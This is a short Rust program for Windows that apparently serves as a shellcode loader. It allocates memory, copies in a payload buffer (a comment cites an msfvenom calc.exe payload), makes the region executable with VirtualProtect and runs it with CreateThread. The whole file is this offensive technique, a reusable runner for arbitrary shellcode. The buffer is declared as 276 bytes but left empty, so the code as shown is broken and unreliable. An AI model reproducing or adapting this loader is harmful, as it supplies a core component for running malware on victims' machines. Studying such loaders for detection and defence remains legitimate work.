use std::ptr::null_mut;

use windows_sys::
{
    Win32::{
    Foundation::*,
    System::{
        Memory::*,
        Threading::*
    }
}
};

fn main() {
    unsafe {
        
    // msfvenom -p windows/x64/exec cmd=calc.exe -f rust
    let buf: [u8; 276] = [];
    
    println!("[ + ] Payload at {:p} of size {}", &buf, buf.len());

    // Memory allocation
    let address = VirtualAlloc(null_mut(), buf.len(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if address.is_null() {
        println!("[ ! ] VirtualAlloc Failed with error : {}", GetLastError());
    }

    println!("[ + ] Allocated Memory in {:p}", address);

    // Write shellcode in allocated memory
    std::ptr::copy_nonoverlapping(buf.as_ptr().cast(), address, buf.len());

    // Change memory protection for execution
    let mut old_protection = 0;

    if VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_protection) == 0 {
        println!("[ ! ] VirtualProtect Failed with error : {}", GetLastError());
    }

    println!("[ + ] Executing Payload");
    // Creating thread for execution
    let thread = CreateThread(null_mut(), 0, Some(std::mem::transmute(address)), null_mut(), 0, null_mut());

    if thread.is_null() {
        println!("[ ! ] CreateThread Failedwith error: {}", GetLastError());
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    }
}